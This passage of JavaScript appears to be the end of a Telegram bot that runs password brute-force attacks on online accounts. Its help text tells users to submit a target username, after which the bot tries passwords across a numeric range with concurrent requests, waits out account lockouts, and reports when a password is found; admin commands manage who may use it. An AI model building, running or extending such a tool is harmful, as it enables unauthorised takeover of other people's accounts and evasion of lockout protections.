    time: new Date().toISOString(),
  });

  bot.sendMessage(
    chatId,
    `✅ *Access Revoked!*\n\n` +
      `🆔 User ID: \`${userId}\`\n` +
      `👥 Total Authorized: ${authorizedUsers.size}`,
    { parse_mode: "Markdown" }
  );

  try {
    await bot.sendMessage(
      userId,
      `⛔ *Access Revoked!*\n\n` + `❌ You can no longer use this bot.`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {}
});

bot.onText(/\/users/, async (msg) => {
  const chatId = msg.chat.id;

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    bot.sendMessage(chatId, "⛔ This command is admin only!");
    return;
  }

  let message = `👥 *Users List*\n\n`;

  message += `🔓 Public Access: ${
    publicAccessEnabled ? "✅ Enabled" : "❌ Disabled"
  }\n\n`;

  if (authorizedUsers.size > 0) {
    message += `✅ *Authorized Users:* (${authorizedUsers.size})\n`;
    authorizedUsers.forEach((userId) => {
      const used = usedUsers.has(userId) ? "✅" : "❌";
      message += `   ${used} \`${userId}\`\n`;
    });
  } else {
    message += `⚠️ No authorized users\n`;
  }

  message += `\n📝 *Total Used:* ${usedUsers.size}\n`;

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/resetall/, async (msg) => {
  const chatId = msg.chat.id;

  if (chatId.toString() !== ADMIN_CHAT_ID) {
    bot.sendMessage(chatId, "⛔ This command is admin only!");
    return;
  }

  runningTasks.forEach((task) => {
    task.isRunning = false;
  });

  const tasksCount = runningTasks.size;
  const usersCount = usedUsers.size;
  const authCount = authorizedUsers.size;

  runningTasks.clear();
  usedUsers.clear();
  authorizedUsers.clear();
  publicAccessEnabled = false;

  bot.sendMessage(
    chatId,
    `🔄 *Full Reset Complete!*\n\n` +
      `✅ ${tasksCount} tests stopped\n` +
      `✅ ${usersCount} used users cleared\n` +
      `✅ ${authCount} authorized users cleared\n` +
      `✅ Public access disabled\n\n` +
      `💡 System ready for use\n` +
      `⚠️ Daily logs are preserved`,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/help/, async (msg) => {
  const chatId = msg.chat.id;
  const access = hasAccess(chatId);

  const helpMessage = `
📖 *Complete Guide*

*1️⃣ Add username:*
\`/add 0123456789\`
Test starts immediately and runs concurrently

*2️⃣ Stop username:*
\`/stop 0123456789\`
Only stops this specific test

*3️⃣ List active tests:*
\`/list\`
Shows what's currently running

*4️⃣ Overall status:*
\`/status\`

⚙️ *Settings:*
• Password Range: ${START} - ${END}
• Concurrent: ${CONCURRENT_REQUESTS}
• Lock Retry: ${LOCK_RETRY_DELAY / 1000 / 60} minutes

${
  access.isAdmin
    ? `\n🔧 *Admin Commands:*\n\n*5️⃣ Toggle public access:*\n\`/allaccess\` - Enable/disable for everyone\n\n*6️⃣ Grant user access:*\n\`/access <user_id>\` - Example: \`/access 123456789\`\n\n*7️⃣ Revoke user access:*\n\`/revoke <user_id>\` - Example: \`/revoke 123456789\`\n\n*8️⃣ List users:*\n\`/users\` - Show authorized and used users\n\n*9️⃣ Today's report:*\n\`/todaylog\` - View today's stats and logs\n\n*🔟 Full reset:*\n\`/resetall\` - Stop all tests and clear lists\n\n📊 *Auto Reporting:*\n• Daily report sent at ${DAILY_REPORT_HOUR}:00\n• Includes: requests, new users, passwords, messages`
    : `\n⚠️ *Limitation:*\nYou can only use this bot once!\n\n🆔 Your ID: \`${chatId}\``
}

💡 *Tips:*
✓ You can add multiple usernames simultaneously
✓ Each runs independently
✓ Stop only affects that specific test
✓ You'll be notified when password is found
✓ Auto-waits when account is locked
  `;

  bot.sendMessage(chatId, helpMessage, { parse_mode: "Markdown" });
});

setupDailyReport();

app.listen(PORT, () => {
  console.log("🤖 Telegram Bot started!");
  console.log(`👤 Admin Chat ID: ${ADMIN_CHAT_ID}`);
  console.log(`🌐 Express Server running on port ${PORT}`);
  console.log(`✅ Health check: http://localhost:${PORT}/health`);
  console.log(`📊 Stats: http://localhost:${PORT}/stats`);
  console.log(
    `🔓 Public Access: ${publicAccessEnabled ? "Enabled" : "Disabled"}`
  );
  console.log(`📊 Daily Report: Every day at ${DAILY_REPORT_HOUR}:00`);
});
